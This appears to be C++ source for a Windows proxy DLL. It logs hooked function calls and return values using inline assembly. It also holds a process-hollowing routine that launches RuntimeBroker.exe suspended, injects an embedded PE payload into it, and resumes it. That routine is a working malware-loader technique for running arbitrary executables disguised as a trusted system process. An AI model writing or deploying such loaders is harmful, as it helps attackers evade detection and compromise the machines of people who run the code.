#include <vector>
#include <windows.h>
#include <iostream>
#include <string>
#include <fstream>
#include <stack>

#include <windows.h>
#include <string>
#include <vector>

#include "process_hollowing.h"
#include "exe_binary.h"

// Struct for the return address hook
struct ReturnHookInfo {
    void* realRetAddr;
    const char* funcName;
};

// Thread local stack for nested function calls in the same thread
thread_local std::stack<ReturnHookInfo> RealReturnAddresses;

// Called by the proxy to setup the hook before jumping to original
extern "C" void* SetupReturnHook(void* realRetAddr, const char* funcName) {
    RealReturnAddresses.push({realRetAddr, funcName});
    extern void GenericReturnHookASM();
    return (void*)GenericReturnHookASM;
}

// Called by the GenericReturnHookASM
extern "C" void* HandleGenericReturn(void* returnValue) {
    if (RealReturnAddresses.empty()) return nullptr;

    ReturnHookInfo info = RealReturnAddresses.top();
    RealReturnAddresses.pop();

    std::ofstream logFile;
    logFile.open("dll_logs.txt", std::ios::app);
    if (logFile.is_open()) {
        logFile << "[RET ] " << info.funcName << " returns: " << returnValue << std::endl;
        logFile.close();
    }

    return info.realRetAddr;
}

// Hook ASM function definition
extern "C" __attribute__((naked)) void GenericReturnHookASM() {
    asm volatile (
        "push %rax\n\t"
        "push %rdx\n\t"
        "push %r8\n\t"
        "push %r9\n\t"
        "push %r10\n\t"
        "push %r11\n\t"

        "sub $16, %rsp\n\t"
        "movdqu %xmm0, (%rsp)\n\t"

        "mov 56(%rsp), %rcx\n\t"
        "sub $32, %rsp\n\t"
        "call HandleGenericReturn\n\t"
        "add $32, %rsp\n\t"

        "mov 56(%rsp), %r11\n\t"
        "mov %rax, 56(%rsp)\n\t"
        "mov %r11, %rax\n\t"

        "movdqu (%rsp), %xmm0\n\t"
        "add $16, %rsp\n\t"

        "pop %r11\n\t"
        "pop %r10\n\t"
        "pop %r9\n\t"
        "pop %r8\n\t"
        "pop %rdx\n\t"
        
        "ret\n\t"
    );
}

std::vector<unsigned char> GetRuntimeBrokerPath() {
	wchar_t buffer[MAX_PATH];
	UINT result = GetSystemDirectoryW(buffer, MAX_PATH);
	if (result == 0 || result > MAX_PATH) {
		return {};
	}
	std::wstring wPath = std::wstring(buffer) + L"\\RuntimeBroker.exe";
	int size_needed = WideCharToMultiByte(CP_UTF8, 0, wPath.c_str(), (int)wPath.size(), NULL, 0, NULL, NULL);
	std::vector<unsigned char> utf8_buffer(size_needed);
	WideCharToMultiByte(CP_UTF8, 0, wPath.c_str(), (int)wPath.size(), reinterpret_cast<char*>(utf8_buffer.data()), size_needed, NULL, NULL);
	return utf8_buffer;
}

int LoadExeIntoMemory() {
    if (rawData == nullptr || payloadSize == 0) {
        MessageBox(0, "Erro: Nenhum payload carregado na memoria global", "Proxy Error", MB_ICONERROR);
        return -1;
    }
    LPVOID hFileContent = (LPVOID) rawData; 
    if (!IsValidPE(hFileContent)) {
        MessageBox(0, "Payload invalido (Nao e um PE valido)", "Proxy Error", MB_ICONERROR);
        return -1;
    }
    BOOL bPayloadIs32Bit = IsPE32(hFileContent);
    char lpTargetProcess[MAX_PATH];
    if (bPayloadIs32Bit) {
        strcpy_s(lpTargetProcess, reinterpret_cast<const char*>(GetRuntimeBrokerPath().data()));
    } else {
        strcpy_s(lpTargetProcess, reinterpret_cast<const char*>(GetRuntimeBrokerPath().data()));
    }
    STARTUPINFOA PI_StartupInfo;
    PROCESS_INFORMATION PI_ProcessInfo;
    memset(&PI_StartupInfo, 0, sizeof(PI_StartupInfo));
    memset(&PI_ProcessInfo, 0, sizeof(PI_ProcessInfo));
    PI_StartupInfo.cb = sizeof(PI_StartupInfo);
    if (!CreateProcessA(NULL, lpTargetProcess, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &PI_StartupInfo, &PI_ProcessInfo)) {
        MessageBox(0, "Erro ao criar processo", "Error", MB_ICONERROR);
        return -1;
    }
    BOOL success = FALSE;
    if (bPayloadIs32Bit) {
        if (HasRelocation32(hFileContent)) {
            success = RunPEReloc32(&PI_ProcessInfo, hFileContent);
        } else {
            success = RunPE32(&PI_ProcessInfo, hFileContent);
        }
    } else {
        if (HasRelocation64(hFileContent)) {
            success = RunPEReloc64(&PI_ProcessInfo, hFileContent);
        } else {
            success = RunPE64(&PI_ProcessInfo, hFileContent);
        }
    }
    if (success) {
        ResumeThread(PI_ProcessInfo.hThread);
    } else {
        TerminateProcess(PI_ProcessInfo.hProcess, 0);
    }
    return 0;
}

extern "C" void FakeFunctionCall(const char* fakeFunctionName, void* arg1, void* arg2, void* arg3, void* arg4) {
    std::ofstream logFile;
    logFile.open("dll_logs.txt", std::ios::app);
    if (logFile.is_open()) {
        logFile << "[CALL] " << fakeFunctionName 
                << " (arg1: " << arg1 
                << ", arg2: " << arg2 
                << ", arg3: " << arg3 
                << ", arg4: " << arg4 << ", ...)" << std::endl;
        logFile.close();
    }
}

extern "C" void LogReturnValue(const char* fakeFunctionName, void* returnValue) {
    std::ofstream logFile;
    logFile.open("dll_logs.txt", std::ios::app);
    if (logFile.is_open()) {
        logFile << "[RET ] " << fakeFunctionName << " returns: " << returnValue << std::endl;
        logFile.close();
    }
}

void YourMain() {

}

void YourEnd() {
    
}